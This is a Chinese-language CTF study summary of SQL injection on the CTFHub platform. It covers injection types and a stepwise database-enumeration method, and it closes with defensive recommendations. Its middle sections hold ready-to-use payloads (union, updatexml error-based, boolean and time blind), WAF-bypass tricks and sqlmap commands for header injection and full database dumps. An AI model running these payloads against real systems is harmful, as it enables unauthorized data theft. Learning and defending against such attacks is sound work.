【微方法论】Web SQL注入漏洞基础利用与工具实战小结（基于CTFHub）

操作者：何芊宏 | 操作日期：2026.9.25 | 分类：Web安全 | 标签：SQL注入, SQLmap, Burp Suite, 微方法论, CTFHub

1. 简介与核心逻辑

SQL注入的本质，是应用程序未能将用户输入的数据与执行的SQL代码进行严格的分离，导致用户输入被数据库当作代码执行。

本次实战的核心攻击逻辑遵循一条标准链路：寻找注入点 -> 判断注入类型（数字/字符） -> 判断回显方式（联合/报错/盲注） -> 绕过防御机制（WAF） -> 提取数据（脱库）。

2. 题型分类与实战差异

基于CTFHub技能树的通关经历，SQL注入可以从以下三个维度进行分类：

2.1 按注入点位置分类

  • URL参数（常见）：如 ?id=1。最常规的注入点，直接在浏览器地址栏或 BP 的 Repeater 中修改即可。
  • HTTP请求头（隐蔽）：如 Cookie、User-Agent、Referer。这类注入点无法在浏览器地址栏直接修改，必须使用 Burp Suite 抓包修改请求头，或使用 SQLmap 的专属参数（如 --cookie、--user-agent、--referer）。

2.2 按回显方式分类（核心）

  • 联合查询注入（有回显）：页面有“黄金回显位”。利用 union select 直接拼接查询结果。注意需要使用 -1 使前半句查询为空，并严格对齐列数。
  • 报错注入（无正常回显，有报错信息）：使用 updatexml() 或 extractvalue() 函数，构造非法参数触发数据库报错，将数据（如库名、表名）在报错信息中带出。
  • 布尔盲注（无回显，无报错，只有真假状态）：页面只返回“对”或“错”。必须使用 if(条件, 1, 1/0) 结合除零报错来制造差异，配合 substr() 和 ascii() 函数，利用二分法逐字猜解。手写脚本网络波动大，推荐使用 SQLmap 的 --technique=B。
  • 时间盲注（无回显，无报错，无状态变化）：页面完全不响应。利用 sleep() 函数（如 if(条件, sleep(5), 0)），通过页面加载的时间差来判断真假。SQLmap 对应 --technique=T。

2.3 按数据库结构分类

  • MySQL结构：查询系统库 information_schema。核心表是 tables（所有表名）和 columns（所有字段名）。无论表名/字段名如何随机生成，都能通过它摸清结构。
  • WAF过滤绕过（如过滤空格）：后端会过滤特定字符。空格过滤时，使用内联注释 /**/ 替代空格；单引号过滤时，可用十六进制 0x... 或双引号绕过。
尚未实战的进阶题型：
在 CTFHub 技能树底部，还有“Where后注入”、“AND/OR注入”、“ORDER BY注入”、“二次注入”、“UPDATE注入”、“INSERT注入”等灰色节点。它们本质上仍是SQL注入，只是注入语句所处于的SQL语法位置不同。目前我们已掌握扎实的基础，后续只需根据具体SQL语句所处的上下文进行调整即可。

3. 通用解题模板：翻目录心法（核心）

你在实战中总结得非常精准：所有SQL注入的最终目标，本质上都是在数据库里“翻目录”。我们利用MySQL自带的系统库 information_schema，按照“库 -> 表 -> 字段 -> 数据”的顺序逐层剥开，最终定位并读取Flag。

第一步：寻找入口（确定注入点）
检查URL参数、Cookie、User-Agent、Referer等位置。尝试闭合字符（1，1'，1")），观察页面是否报错或改变。
第二步：确认类型与回显（摸底）
测试 and 1=1 / and 1=2 判断真假。如果能回显数据，走Union；如果报错回显数据，走报错注入；如果什么都不显示，走盲注。
第三步：突破防御（WAF绕过）
如果是过滤空格，将Payload中所有空格替换为 /**/；如果是过滤关键字，尝试双写、大小写或内联注释。
第四步：逐级翻目录（脱库）

“翻目录”具体操作蓝图（手工与工具对比）：

层级 手工联合查询（有回显） SQLmap 自动化
第一层：查库名 -1 union select 1,database() --dbs
第二层：查表名 -1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -D "库名" --tables
第三层：查字段名 -1 union select 1,group_concat(column_name) from information_schema.columns where table_name='表名' -D "库名" -T "表名" --columns
第四层：查数据 -1 union select 1,字段名 from 表名 -D "库名" -T "表名" --dump

4. 实战Payload与命令模板库（必备参考）

4.1 URL参数注入（手工基础）

  • 字符型闭合测试： 1' and '1'='1' --+ / 1' and '1'='2' --+
  • 联合查询找列数： 1' order by 2 --+ (逐步递增)
  • 联合查询找回显： -1' union select 1,2 --+
  • 查库名： -1' union select 1,database() --+
  • 查表名： -1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+
  • 查字段名： -1' union select 1,group_concat(column_name) from information_schema.columns where table_name='表名' --+
  • 提取数据： -1' union select 1,字段名 from 表名 --+

4.2 报错注入（无回显，有报错）

  • 查库名： 1' and updatexml(1,concat(0x7e,database()),1) --+
  • 查表名： 1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+
  • 查字段名： 1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='表名')),1) --+
  • 提取数据： 1' and updatexml(1,concat(0x7e,(select 字段名 from 表名)),1) --+

4.3 布尔盲注与时间盲注（无回显，无报错）

  • 布尔盲注逻辑： 1' and if(ascii(substr(database(),1,1))>100, 1, 1/0) --+
  • 时间盲注逻辑： 1' and if(ascii(substr(database(),1,1))>100, sleep(3), 0) --+
  • 注意：这类注入手工猜解极慢，需结合 Python 脚本（二分法）或直接使用 SQLmap 的 --technique=B 或 --technique=T。

4.4 HTTP头注入与SQLmap自动化命令

  • 注入点标记：在SQLmap参数中，使用星号 * 标记注入位置。
  • Cookie注入： python sqlmap.py -u "URL" --cookie="id=1*" --dbs --batch --threads=1
  • UA注入： python sqlmap.py -u "URL" --user-agent="1*" --dbs --batch --threads=1
  • Referer注入： python sqlmap.py -u "URL" --referer="1*" --dbs --batch --threads=1
  • 脱库三连击： --dbs -> -D "库名" --tables -> -D "库名" -T "表名" --dump
  • 绕过WAF（如过滤空格）： python sqlmap.py -u "URL" --tamper="space2comment.py" --dbs --batch --threads=1
  • 强制联合查询提速（防盲注）： --technique=U
  • 单线程保命（防请求过多把环境打挂）： --threads=1

5. 相同点与差异性总结

  • 相同点（不变的法则）：
    • 底层的脱库流程完全一致：查库名 -> 查表名 -> 查字段名 -> 提取数据。
    • 目标一致：获取隐藏的 Flag（通常位于随机生成的表和字段中）。
    • 闭合原理一致：字符型注入都需要闭合引号，并用 # 或 --+ 注释掉多余的代码。
  • 差异点（对症下药）：
    • Payload 构造取决于回显方式（Union 优先，盲注必须依赖 if() 和 sleep()）。
    • Payload 的绕过方式取决于 WAF 过滤规则（用 /**/ 绕空格，用双引号或十六进制绕单引号）。
    • 工具的参数配置取决于注入点位置（URL 用 -u，HTTP头用 --user-agent 等）。

6. 实战避坑指南

  • WAF 的静默拦截与误判：有时候返回状态码是 200（页面正常渲染），但数据为空。这通常不是环境重置，而是 WAF 拦截了特定的关键字组合，直接返回了空结果。此时应尝试改变 Payload 组合或使用 tamper 脚本。
  • 不要盲目迷信工具：SQLmap 的初始启发式探测可能被非标准 WAF 欺骗（如只过滤空格，不回显真假的题目）。如果它报 [CRITICAL] all tested parameters do not appear to be injectable，尝试手动指定 --tamper、--technique 或 --level 级别。
  • 随机生成的陷阱：表名和字段名往往是随机字符串。一旦环境因意外情况重置，之前的随机名称全部失效，需要重新查询。
  • 控制并发频率：跑 SQLmap 时，务必加上 --threads=1。单线程虽慢，但能尽可能避免因高频请求导致服务器主动断开连接。

7. 安全防御建议

  • 使用参数化查询（预编译语句）：从根本上将代码与数据分离，这是防御 SQL 注入最有效的手段。
  • 最小权限原则：数据库连接账户只给予必要的增删改查权限，禁止使用 root 或 DBA 权限连接。
  • 输入验证与过滤：对用户输入进行严格的类型检查（如 id 必须是数字），并过滤掉 SQL 关键字和特殊符号。
  • 错误信息屏蔽：关闭生产环境的数据库报错回显，避免攻击者利用报错注入获取敏感信息。
